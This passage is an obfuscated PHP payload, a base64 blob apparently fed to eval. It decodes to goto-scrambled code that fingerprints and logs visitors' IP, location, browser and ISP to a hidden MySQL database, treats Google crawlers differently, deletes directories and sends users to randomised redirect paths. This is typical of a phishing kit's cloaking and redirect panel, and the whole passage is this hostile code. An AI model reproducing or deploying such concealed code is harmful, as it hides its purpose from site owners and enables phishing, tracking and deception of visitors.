E2M1wxNjRcMTY1XDE2NlwxNjdceDc4XHg3OVwxNzJcNjBcNjFcNjJcNjNcNjRcNjVceDM2XHgzN1w3MFx4MzlcMTAxXDEwMlwxMDNceDQ0XDEwNVx4NDZceDQ3XHg0OFwxMTFceDRhXDExM1wxMTRcMTE1XDExNlx4NGZceDUwXDEyMVwxMjJcMTIzXDEyNFwxMjVceDU2XHg1N1x4NThcMTMxXDEzMiI7ICRjaGFyYWN0ZXJzTGVuZ3RoID0gc3RybGVuKCRjaGFyYWN0ZXJzKTsgJHJhbmRvbVN0cmluZyA9ICcnOyBmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyAkaSsrKSB7ICRyYW5kb21TdHJpbmcgLj0gJGNoYXJhY3RlcnNbcmFuZCgwLCAkY2hhcmFjdGVyc0xlbmd0aCAtIDEpXTsgfSByZXR1cm4gJHJhbmRvbVN0cmluZzsgfSBnb3RvIEtxMzZ4OyBFd2N1UjogJF9TRVNTSU9OWyJcMTcwXDExN1x4NzBceDc1XHg3OSJdID0gaXNzZXQoJGluZm9bIlwxNjJcMTQ1XHg2N1x4NjlceDZmXHg2ZVx4NGVceDYxXHg2ZFwxNDUiXSkgPyAkaW5mb1siXHg3Mlx4NjVcMTQ3XHg2OVx4NmZceDZlXDExNlx4NjFceDZkXDE0NSJdIDogbnVsbDsgZ290byBIYVFzMzsgV1B3U2s6ICRkYXRhbG9nID0gYmFzZTY0X2RlY29kZSgiXDE0NVwxNTVceDU2XDE3MVwxNDJceDc5XHgzMVwxNTNceDU5XHg1OFx4NmJcMTY1XDE0M1x4MzJcMTUwXHg3NlwxNDNcMTAxIik7IGdvdG8gSHJRYXQ7IGRKdVI1OiAkX1NFU1NJT05bIlx4NDJcMTU0XDE0MVx4NzNceDYxXHg2M1x4NmZcMTY1XDE1NiJdID0gaXNzZXQoJGluZm9bIlx4NjNcMTU3XDE2NVwxNTZceDc0XDE2MlwxNzEiXSkgPyAkaW5mb1siXDE0M1x4NmZcMTY1XHg2ZVwxNjRcMTYyXHg3OSJdIDogbnVsbDsgZ290byBvNElwQjsgblFwQVY6ICRkb21haW4gPSAkX1NFUlZFUlsiXDExMFx4NTRcMTI0XHg1MFx4NWZcMTEwXHg0Zlx4NTNcMTI0Il07IGdvdG8gZEEyT2w7IHp4TTNSOiAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGN1cmwpOyBnb3RvIGFMUHU3OyBwT2VHVzogZnVuY3Rpb24gSFlUX0REUl9VaW8oJFVTRVJfQUdFTlQpIHsgJE9TX0VSUk9SID0gIlx4NTVceDZlXDE1M1x4NmVcMTU3XHg3N1x4NmVcNDBcMTE3XHg1M1w0MFx4NTBceDZjXHg2MVwxNjRcMTQ2XDE1N1wxNjJcMTU1IjsgJE9TID0gYXJyYXkoIlw1N1wxNjdceDY5XHg2ZVx4NjRceDZmXHg3N1wxNjNcNDBceDZlXDE2NFx4MjBcNjFceDMwXHgyZlwxNTEiID0+ICJceDU3XDE1MVx4NmVcMTQ0XHg2ZlwxNjdcMTYzXDQwXDYxXDYwIiwgIlx4MmZcMTY3XHg2OVx4NmVceDY0XDE1N1x4NzdcMTYzXDQwXDE1Nlx4NzRceDIwXHgzNlw1Nlw2M1x4MmZceDY5IiA9PiAiXHg1N1wxNTFceDZlXHg2NFx4NmZceDc3XDE2M1x4MjBcNzBceDJlXDYxIiwgIlw1N1x4NzdceDY5XDE1NlwxNDRcMTU3XHg3N1x4NzNceDIwXHg2ZVx4NzRcNDBcNjZceDJlXDYyXDU3XHg2OSIgPT4gIlwxMjdceDY5XDE1NlwxNDRcMTU3XHg3N1x4NzNceDIwXDcwIiwgIlx4MmZcMTY3XHg2OVx4NmVcMTQ0XHg2Zlx4NzdcMTYzXDQwXHg2ZVx4NzRceDIwXHgzNlx4MmVcNjFceDJmXDE1MSIgPT4gIlwxMjdceDY5XDE1NlwxNDRcMTU3XHg3N1x4NzNceDIwXHgzNyIsICJceDJmXHg3N1wxNTFcMTU2XHg2NFx4NmZcMTY3XHg3M1w0MFwxNTZcMTY0XDQwXDY2XDU2XHgzMFx4MmZceDY5IiA9PiAiXHg1N1x4NjlceDZlXDE0NFx4NmZceDc3XDE2M1w0MFx4NTZceDY5XDE2M1wxNjRcMTQxIiwgIlw1N1wxNjdceDY5XHg2ZVwxNDRceDZmXDE2N1x4NzNceDIwXDE1NlwxNjRcNDBcNjVcNTZceDMyXHgyZlx4NjkiID0+ICJcMTI3XHg2OVx4NmVceDY0XHg2ZlwxNjdcMTYzXDQwXHg1M1x4NjVceDcyXDE2Nlx4NjVcMTYyXDQwXDYyXDYwXHgzMFx4MzNcNTdcMTMwXDEyMFw0MFx4NzhcNjZcNjQiLCAiXHgyZlx4NzdceDY5XHg2ZVx4NjRcMTU3XHg3N1x4NzNceDIwXHg2ZVwxNjRceDIwXDY1XDU2XHgzMVx4MmZceDY5IiA9PiAiXDEyN1wxNTFcMTU2XDE0NFwxNTdceDc3XDE2M1x4MjBceDU4XDEyMCIsICJcNTdcMTY3XHg2OVwxNTZcMTQ0XDE1N1x4NzdcMTYzXDQwXHg3OFx4NzBcNTdceDY5IiA9PiAiXHg1N1wxNTFceDZlXDE0NFwxNTdcMTY3XHg3M1w0MFwxMzBceDUwIiwgIlw1N1x4NzdcMTUxXHg2ZVx4NjRcMTU3XDE2N1wxNjNceDIwXDE1NlwxNjRcNDBcNjVcNTZceDMwXHgyZlwxNTEiID0+ICJcMTI3XDE1MVx4NmVcMTQ0XHg2Zlx4NzdceDczXHgyMFx4MzJcNjBceDMwXDYwIiwgIlx4MmZcMTY3XHg2OVx4NmVceDY0XHg2Zlx4NzdceDczXDQwXDE1NVwxNDVcNTdcMTUxIiA9PiAiXDEyN1x4NjlcMTU2XHg2NFwxNTdceDc3XDE2M1w0MFwxMTVceDQ1IiwgIlw1N1wxNjdceDY5XDE1Nlx4MzlceDM4XDU3XDE1MSIgPT4gIlx4NTdceDY5XDE1NlwxNDRcMTU3XDE2N1x4NzNcNDBceDM5XDcwIiwgIlw1N1wxNjdcMTUxXHg2ZVx4MzlcNjVcNTdceDY5IiA9PiAiXDEyN1x4NjlcMTU2XDE0NFwxNTdcMTY3XDE2M1w0MFw3MVx4MzUiLCAiXDU3XHg3N1x4NjlceDZlXHgzMVw2Nlx4MmZceDY5IiA9PiAiXHg1N1x4NjlcMTU2XHg2NFx4NmZceDc3XDE2M1x4MjBceDMzXHgyZVx4MzFceDMxIiwgIlw1N1wxNTVceDYxXHg2M1x4NjlcMTU2XHg3NFwxNTdcMTYzXDE1MFwxNzRceDZkXHg2MVwxNDNcNDBceDZmXDE2M1w0MFwxNzBcNTdceDY5IiA9PiAiXDExNVwxNDFceDYzXHgyMFwxMTdcMTIzXDQwXHg1OCIsICJceDJmXDE1NVx4NjFcMTQzXHg1ZlwxNjBcMTU3XDE2N1x4NjVceDcyXHg3MFwxNDNceDJmXDE1MSIgPT4gIlx4NGRceDYxXHg2M1w0MFwxMTdcMTIzXHgyMFw3MSIsICJcNTdcMTU0XDE1MVx4NmVceDc1XHg3OFx4MmZcMTUxIiA9PiAiXDExNFwxNTFcMTU2XDE2NVx4NzgiLCAiXHgyZlx4NzVcMTQyXHg3NVwxNTZceDc0XDE2NVx4MmZcMTUxIiA9PiAiXHg1NVx4NjJceDc1XDE1Nlx4NzRceDc1IiwgIlw1N1x4NjlceDcwXHg2OFx4NmZceDZlXDE0NVx4MmZceDY5IiA9PiAiXHg2OVx4NTBceDY4XHg2ZlwxNTZceDY1IiwgIlx4MmZceDY5XDE2MFwxNTdceDY0XDU3XHg2OSIgPT4gIlx4NjlcMTIwXDE1N1x4NjQiLCAiXDU3XHg2OVwxNjBceDYxXDE0NFw1N1x4NjkiID0+ICJcMTUxXHg1MFx4NjFcMTQ0IiwgIlw1N1x4NjFcMTU2XHg2NFwxNjJcMTU3XHg2OVx4NjRceDJmXHg2OSIgPT4gIlwxMDFcMTU2XDE0NFx4NzJcMTU3XHg2OVwxNDQiLCAiXDU3XDE0MlwxNTRceDYxXHg2M1x4NmJcMTQyXHg2NVwxNjJceDcyXDE3MVx4MmZcMTUxIiA9PiAiXDEwMlwxNTRcMTQxXDE0M1wxNTNceDQyXHg2NVx4NzJceDcyXDE3MSIsICJcNTdceDc3XHg2NVwxNDJceDZmXDE2M1w1N1wxNTEiID0+ICJceDRkXDE1N1x4NjJcMTUxXDE1NFwxNDUiKTsgZm9yZWFjaCAoJE9TIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgaWYgKHByZWdfbWF0Y2goJHJlZ2V4LCAkVVNFUl9BR0VOVCkpIHsgJE9TX0VSUk9SID0gJHZhbHVlOyB9IH0gcmV0dXJuICRPU19FUlJPUjsgfSBnb3RvIHUxUDAyOyBkMXhycTogZnVuY3Rpb24gY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KSB7ICR1c2VyQWdlbnQgPSBpc3NldCgkX1NFUlZFUlsiXDExMFx4NTRcMTI0XDEyMFx4NWZceDU1XHg1M1wxMDVcMTIyXHg1Zlx4NDFcMTA3XDEwNVx4NGVceDU0Il0pID8gJF9TRVJWRVJbIlx4NDhceDU0XHg1NFwxMjBceDVmXDEyNVwxMjNcMTA1XDEyMlx4NWZcMTAxXHg0N1x4NDVcMTE2XDEyNCJdIDogJyc7ICRpc3AgPSAkX1NFU1NJT05bIlx4NjlcMTYzXHg3MCJdOyAkSXBDb3VudCA9IEZPeF9UR0hfWCgkdXNlckFnZW50KTsgJE9LSklWR1JEID0gSFlUX0REUl9VaW8oJHVzZXJBZ2VudCk7ICRkb25mbGFnID0gJF9TRVJWRVJbIlwxMjNceDQ1XDEyMlx4NTZceDQ1XHg1MlwxMzdcMTE2XHg0MVwxMTVcMTA1Il07ICRMT0NBTE9fVEVNUE8gPSBkYXRlKCJcMTMxXHgyZFx4NmRcNTVceDY0XHgyMFwxMTBcNzJceDY5XDcyXDE2MyIpOyAkQmxhc2Fjb3VuID0gJF9TRVNTSU9OWyJceDQyXHg2Y1wxNDFcMTYzXHg2MVwxNDNceDZmXDE2NVx4NmUiXTsgJE5qb3BmID0gJF9TRVNTSU9OWyJceDRlXDE1MlwxNTdceDcwXDE0NiJdOyAkVm9wcnQgPSAkX1NFU1NJT05bIlwxMjZcMTU3XHg3MFx4NzJceDc0Il07ICR4T3B1eSA9ICRfU0VTU0lPTlsiXDE3MFx4NGZcMTYwXHg3NVx4NzkiXTsgJGhvc3QgPSBnZXRob3N0YnlhZGRyKCRTdHJ1cExvbSk7ICRkYiA9IG15c3FsaV9jb25uZWN0KCRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2dik7IGlmICghJGRiKSB7IGRpZSgiXDEwM1x4NmZceDZlXHg2ZVx4NjVceDYzXHg3NFx4NjlcMTU3XHg2ZVx4MjBcMTQ2XDE0MVwxNTFcMTU0XHg2NVx4NjRceDNhXDQwIiAuIG15c3FsaV9jb25uZWN0X2Vycm9yKCkpOyB9ICRzcWxfdSA9ICJceDUzXDEwNVwxMTRceDQ1XDEwM1x4NTRcNDBcNTJceDIwXDEwNlx4NTJceDRmXHg0ZFx4MjBceDZjXHg2ZlwxNDdceDczXHgyMFx4NTdceDQ4XHg0NVx4NTJceDQ1XDQwXDE1MVwxNjBceDYxXDE0NFwxNDRcMTYyXDE0NVx4NzNcNzVcNDd7JFN0cnVwTG9tfVw0NyI7ICRyZXNfdSA9IG15c3FsaV9xdWVyeSgkZGIsICRzcWxfdSk7IGlmIChteXNxbGlfbnVtX3Jvd3MoJHJlc191KSA+IDApIHsgbXlzcWxpX2Nsb3NlKCRkYik7IGVjaG8gIlw0MVx4MjEiOyBkaWU7IH0gZWxzZSB7ICRTdHJ1cExvbSA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXDQ3IiwgJycsICRTdHJ1cExvbSkpOyAkQmxhc2Fjb3VuID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJceDI3IiwgJycsICRCbGFzYWNvdW4pKTsgJElwQ291bnQgPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlx4MjciLCAnJywgJElwQ291bnQpKTsgJE9LSklWR1JEID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJcNDciLCAnJywgJE9LSklWR1JEKSk7ICRkb25mbGFnID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJceDI3IiwgJycsICRkb25mbGFnKSk7ICRMT0NBTE9fVEVNUE8gPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlx4MjciLCAnJywgJExPQ0FMT19URU1QTykpOyAkaG9zdCA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXHgyNyIsICcnLCAkaG9zdCkpOyAkaXNwID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJcNDciLCAnJywgJGlzcCkpOyAkcmVmaXggPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlw0NyIsICcnLCAkcmVmaXgpKTsgJHF1ZXJ5ID0gIlx4NDlceDRlXHg1M1wxMDVcMTIyXHg1NFx4MjBcMTExXDExNlwxMjRceDRmXHgyMFwxNTRceDZmXHg2N1x4NzNcNDBceDI4XDE1MVwxNjBcMTQxXHg2NFwxNDRcMTYyXDE0NVx4NzNcNTRceDYzXDE1N1wxNjVcMTU2XHg3NFx4NzJcMTcxXHgyY1x4NjJceDcyXHg2Zlx4NzdcMTYzXDE0NVx4NzJcNTRceDZmXHg3M1w1NFwxNDRceDZmXHg2ZFwxNTFcMTU2XDE0NVw1NFx4NmRcMTcxXDE2NFx4NjlceDZkXDE0NVx4MmNcMTUwXDE1N1x4NzNcMTY0XHgyY1wxNTFceDczXDE2MFw1NFx4NzJceDY1XDE2M1x4NmZcMTU2XHgyOVw0MFwxMlx4MjBceDIwXDQwXDQwXDQwXHgyMFx4OVw0MFw0MFx4MjBcNDBceDlcNDBceDIwXHg1Nlx4NDFceDRjXDEyNVx4NDVceDUzXHgyMFx4MjhcNDd7JFN0cnVwTG9tfVx4MjdceDJjXHgyN3skQmxhc2Fjb3VufVw0N1w1NFw0N3skSXBDb3VudH1ceDI3XDU0XHgyN3skT0tKSVZHUkR9XDQ3XDU0XDQ3eyRkb25mbGFnfVx4MjdceDJjXHgyN3skTE9DQUxPX1RFTVBPfVx4MjdceDJjXHgyN3skaG9zdH1cNDdceDJjXDQ3eyRpc3B9XDQ3XDU0XHgyN3skcmVmaXh9XHgyN1w1MSI7ICRyZXN1bHRzID0gbXlzcWxpX3F1ZXJ5KCRkYiwgJHF1ZXJ5KTsgbXlzcWxpX2Nsb3NlKCRkYik7IGVjaG8gIlx4MjEiOyB9IH0gZ290byBxT1h6cjsgYUxQdTc6IGN1cmxfY2xvc2UoJGN1cmwpOyBnb3RvIFJFdjY0OyBxT1h6cjogaWYgKHN0cnBvcygkdXNlckFnZW50LCAiXDE0N1x4NmZceDZmXDE0N1x4NmNcMTQ1IikgIT09IGZhbHNlKSB7ICRyZWZpeCA9ICJceDQyXHg2ZlwxNjNceDY1XHgyMFwxMDciOyBjbGlja19UWXF3KCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkcmVmaXgpOyBkaWU7IH0gZ290byBjM3prcDsgUVhidlQ6ICRSYW5kT1BfTSA9IFJhbmRfWERfVEYocmFuZCg3LCA3KSk7IGdvdG8gdEF6YXM7IFRIVXZNOiAkTm9wd3Z2ID0gYmFzZTY0X2RlY29kZSgiXDE0M1x4MzNcMTIyXHg3OVwxNDJcNjJcNjVceDZlXHg1OFw2Mlx4NTJceDY4XDE0NVx4NTEiKTsgZ290byBLUXhhWjsgYXVJbHM6IGlmIChpc19hcnJheSgkZGlyZWN0b3JpZXMpKSB7IGZvcmVhY2ggKCRkaXJlY3RvcmllcyBhcyAkZGlyKSB7IGlmIChiYXNlbmFtZSgkZGlyKVswXSAhPSAiXDU2IikgeyBpZiAoZGVsZXRlRGlyZWN0b3J5KCRkaXIpKSB7IH0gfSB9IH0gZ290byB6MTdGUzsgUnZuMTQ6ICRkaXJlY3RvcmllcyA9IGdsb2IoJHBhcmVudERpcmVjdG9yeSAuICJceDJmXHgyYSIsIEdMT0JfT05MWURJUik7IGdvdG8gYXVJbHM7IFA1MWZhOiAkcGFyZW50RGlyZWN0b3J5ID0gIlwxNjdcMTQ1XHg2MiI7IGdvdG8gUnZuMTQ7IFFacVd3OiBpZiAoaXNzZXQoJF9QT1NUWyJceDczXDE1MFx4NmZceDcwXDE1MVwxNDQiXSkpIHsgJGdhbWVpZCA9ICRfUE9TVFsiXHg3M1x4NjhcMTU3XDE2MFx4NjlcMTQ0Il07ICRfU0VTU0lPTlsiXDE1NFwxNTdceDZjXDE2M1x4NmZcMTY1XDE1NFx4NzMiXSA9ICRnYW1laWQ7IFJESU9QQigkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJGdhbWVpZCk7IH0gZ290byBVZFJQQzsga0VMZXM6IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgZ290byB6eE0zUjsgQkpMM0k6IGVycm9yX3JlcG9ydGluZyhFX0FMTCk7IGdvdG8gRUlEMko7IFRtMzFsOiBpZiAoaXNzZXQoJF9QT1NUWyJcMTU0XHg2ZlwxNDNcMTQxXDE1NFx4NjlceDcwIl0pKSB7ICRteWlwcyA9IGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlx4NmNceDZmXHg2M1wxNDFcMTU0XDE1MVwxNjAiXSkpOyAkX1NFU1NJT05bIlwxNTRcMTU3XDE1NFx4NjlcMTYwXDE2MyJdID0gJG15aXBzOyAkU3RydXBMb20gPSAkbXlpcHM7IH0gZ290byBTaHo0SjsgRUlEMko6IGluaV9zZXQoIlx4NjRcMTUxXHg3M1x4NzBceDZjXHg2MVwxNzFcMTM3XHg2NVwxNjJceDcyXHg2ZlwxNjJceDczIiwgMSk7IGdvdG8gcXFfa3M7IGllYkFuOiAkSXBDb3VudCA9IEZPeF9UR0hfWCgkdXNlckFnZW50KTsgZ290byBkMXhycTsgdEFTRU06IGlmIChpc3NldCgkX0dFVFsiXHg2NVx4NmVceDY0XDE1NVwxNDVceDZjXDE2NVwxNzAiXSkpIHsgJHJlZGkgPSAkX0NPT0tJRVsiXDE2Mlx4NjVceDY0XDE1MVwxNjJceDY5XDE0M1wxNjQiXTsgJHZkaXIgPSAkX0dFVFsiXDE0NVwxNTZcMTQ0XHg2ZFwxNDVcMTU0XHg3NVwxNzAiXTsgJGRpcmVjdG9yeVRvRGVsZXRlID0gIlx4NzdcMTQ1XDE0Mlw1NyIgLiAkdmRpcjsgaWYgKGlzX2RpcigkZGlyZWN0b3J5VG9EZWxldGUpKSB7IGlmIChkZWxldGVEaXJlY3RvcnluZXcoJGRpcmVjdG9yeVRvRGVsZXRlKSkgeyB9IH0gZWNobyAiXDc0XHg3M1x4NjNcMTYyXDE1MVwxNjBcMTY0XDQwXDExNFx4NDFcMTE2XHg0N1x4NTVceDQxXDEwN1wxMDVcNzVcNDdceDRhXDE0MVwxNjZceDYxXHg1M1x4NjNceDcyXHg2OVwxNjBceDc0XDQ3XDc2XDEyXHgyMFw0MFw0MFx4MjBcMTY3XHg2OVx4NmVcMTQ0XHg2ZlwxNjdcNTZceDZjXDE1N1wxNDNcMTQxXHg3NFwxNTFceDZmXDE1Nlx4MmVcMTUwXHg3MlwxNDVceDY2XHgzZFx4Mjd7JHJlZGl9XHgyN1w3M1x4YVx4MjBcNDBcNDBcNDBcNzRceDJmXHg3M1wxNDNcMTYyXDE1MVwxNjBcMTY0XDc2IjsgZGllOyB9IGdvdG8geEUwQTM7IEhyUWF0OiAkRml4Ym9tID0gYmFzZTY0X2RlY29kZSgiXDE0M1x4MzNceDUyXHg3OVwxNDJceDMyXHgzNVwxNTZcMTMwXHgzMlwxMjJceDY4XDE0NVwxMjEiKTsgZ290byB3WTlmbTsgekE2ZUE6IGlmIChpc3NldCgkX0dFVFsiXDE2NlwxNjNceDczIl0pKSB7ICRnYW1laWQgPSAkX0dFVFsiXHg3M1wxNTdceDc1XDE1NFx4NzMiXTsgJF9TRVNTSU9OWyJcMTU0XHg2Zlx4NmNcMTYzXDE1N1x4NzVceDZjXDE2MyJdID0gJGdhbWVpZDsgUkRJT1BCKCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkZ2FtZWlkKTsgJGZvbGRlcl9wYXRoeCA9ICRfR0VUWyJceDc2XDE2M1wxNjMiXTsgJFJhbmRPUF9NbHV4ID0gUmFuZF9YRF9URihyYW5kKDQsIDEwKSk7IGVjaG8gIlw3NFx4NzNcMTQzXDE2MlwxNTFceDcwXHg3NFx4MjBceDRjXDEwMVwxMTZcMTA3XHg1NVwxMDFcMTA3XHg0NVw3NVx4MjdcMTEyXDE0MVx4NzZcMTQxXDEyM1x4NjNcMTYyXDE1MVx4NzBcMTY0XHgyN1w3NlwxMlx4MjBceDIwXHgyMFx4MjBcMTY3XDE1MVx4NmVcMTQ0XDE1N1wxNjdcNTZcMTU0XDE1N1wxNDNcMTQxXHg3NFx4NjlceDZmXDE1Nlx4MmVcMTUwXDE2MlwxNDVcMTQ2XHgzZFx4Mjd7JGZvbGRlcl9wYXRoeH1cNzdcNDZcMTY2XDE0MVwxNTRceDY5XHg2NFw3NXskUmFuZE9QX01sdXh9eyRSYW5kT1BfTWx1eH1ceDI2XHg2MVwxNTRcMTQ1XHg3MlwxNjRcNzV7JFJhbmRPUF9NbHV4fVw0Nlx4NzhcMTU0XHg3MFx4NzNcNzV7JFJhbmRPUF9NbHV4fVx4MjZceDczXDE1N1x4NzVceDZjXHg3M1x4M2R7JGdhbWVpZH1ceDI2XHg2NFwxNTdceDZlXDE0NVx4M2RcNDZceDY1XDE2MlwxNjJcMTU3XDE2MlwxNzFceDNkeyRSYW5kT1BfTWx1eH1cNDZceDZkXDE1Nlx4NjVcMTU1XDE1N1x4NmVceDY5XHg2M1w3NVw0Nlx4NmFcMTQyXDc1eyRSYW5kT1BfTWx1eH1ceDI3XHgzYlwxMlw0MFw0MFw0MFx4MjBcNzRceDJmXDE2M1wxNDNceDcyXHg2OVx4NzBcMTY0XDc2IjsgZGllOyB9IGdvdG8gUVpxV3c7IEZYTDlQOiAkaXBQb3J0QXJyYXkgPSBleHBsb2RlKCJcNzIiLCAkaXBBZGRyZXNzKTsgZ290byBiNldaVTsgS3EzNng6IGZ1bmN0aW9uIHJhbmRfbnVtKCRsZW5ndGgpIHsgJGNoYXJhY3RlcnMgPSAiXHgzMFx4MzFceDMyXDYzXHgzNFx4MzVcNjZceDM3XDcwXHgzOSI7ICRjaGFyYWN0ZXJzTGVuZ3RoID0gc3RybGVuKCRjaGFyYWN0ZXJzKTsgJHJhbmRvbVN0cmluZyA9ICcnOyBmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyAkaSsrKSB7ICRyYW5kb21TdHJpbmcgLj0gJGNoYXJhY3RlcnNbcmFuZCgwLCAkY2hhcmFjdGVyc0xlbmd0aCAtIDEpXTsgfSByZXR1cm4gJHJhbmRvbVN0cmluZzsgfSBnb3RvIHBPZUdXOyBaSU82WDogZnVuY3Rpb24gZGVsZXRlRGlyZWN0b3J5KCRkaXIpIHsgaWYgKCFmaWxlX2V4aXN0cygkZGlyKSkgeyByZXR1cm4gdHJ1ZTsgfSBpZiAoIWlzX2RpcigkZGlyKSkgeyByZXR1cm4gdW5saW5rKCRkaXIpOyB9ICR0aW1lX2RpZmYgPSB0aW1lKCkgLSBmaWxlY3RpbWUoJGRpcik7IGlmICgkdGltZV9kaWZmID4gMjkwKSB7IGZvcmVhY2ggKHNjYW5kaXIoJGRpcikgYXMgJGl0ZW0pIHsgaWYgKCRpdGVtID09ICJceDJlIiB8fCAkaXRlbSA9PSAiXDU2XHgyZSIpIHsgY29udGludWU7IH0gaWYgKCFkZWxldGVEaXJlY3RvcnkoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkaXRlbSkpIHsgcmV0dXJuIGZhbHNlOyB9IH0gaWYgKHJtZGlyKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGVsc2UgeyByZXR1cm4gZmFsc2U7IH0gfSBlbHNlIHsgcmV0dXJuIHRydWU7IH0gfSBnb3RvIFA1MWZhOyBTZW5JODogJF9TRVNTSU9OWyJcMTI2XDE1N1x4NzBceDcyXHg3NCJdID0gaXNzZXQoJGluZm9bIlwxNDNceDY5XHg3NFwxNzEiXSkgPyAkaW5mb1siXHg2M1x4NjlcMTY0XDE3MSJdIDogbnVsbDsgZ290byBFd2N1UjsgYjZXWlU6ICRTdHJ1cExvbSA9ICRpcFBvcnRBcnJheVswXTsgZ290byBZc29zbTsgWXNvc206ICRkb21pbmUgPSAkX1NFUlZFUlsiXDEyM1x4NDVceDUyXHg1Nlx4NDVcMTIyXDEzN1wxMTZcMTAxXDExNVx4NDUiXTsgZ290byBzalVvbDsgU2h6NEo6ICRwcm90b2NvbCA9IGlzc2V0KCRfU0VSVkVSWyJceDQ4XHg1NFx4NTRceDUwXHg1MyJdKSAmJiAkX1NFUlZFUlsiXHg0OFx4NTRceDU0XHg1MFx4NTMiXSA9PT0gIlwxNTdceDZlIiA/ICJceDY4XDE2NFx4NzRcMTYwXHg3MyIgOiAiXDE1MFwxNjRceDc0XDE2MCI7IGdvdG8gblFwQVY7IHNqVW9sOiAkVElNRV9EQVRFID0gZGF0ZSgiXHg1OVw1NVwxNTVceDJkXHg2NFw0MFx4NDhcNzJceDY5XHgzYVwxNjMiKTsgZ290byBUbTMxbDsgbzRJcEI6ICRfU0VTU0lPTlsiXHg0ZVx4NmFceDZmXDE2MFx4NjYiXSA9IGlzc2V0KCRpbmZvWyJcMTQzXHg2ZlwxNjVcMTU2XDE2NFx4NzJcMTcxXHg0M1x4NmZcMTQ0XDE0NSJdKSA/ICRpbmZvWyJcMTQzXDE1N1x4NzVcMTU2XDE2NFx4NzJceDc5XHg0M1x4NmZcMTQ0XHg2NSJdIDogbnVsbDsgZ290byBTZW5JODsgbHN4aEQ6IA==')); ?>
